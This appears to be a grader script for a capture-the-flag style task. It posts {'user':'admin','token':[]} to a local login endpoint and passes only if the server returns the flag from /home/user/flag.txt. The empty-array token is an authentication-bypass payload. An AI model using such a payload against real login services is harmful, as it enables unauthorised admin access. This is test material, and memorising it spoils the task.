#!/usr/bin/env python3
import json
import sys
from pathlib import Path
from urllib.request import Request, urlopen

expected = Path("/home/user/flag.txt").read_text().strip()
request = Request(
    "http://127.0.0.1:3000/login",
    data=b'{"user":"admin","token":[]}',
    headers={"Content-Type": "application/json"},
    method="POST",
)

try:
    with urlopen(request, timeout=10) as response:
        result = json.load(response)
except (OSError, ValueError):
    sys.exit(1)

sys.exit(result != {"flag": expected})
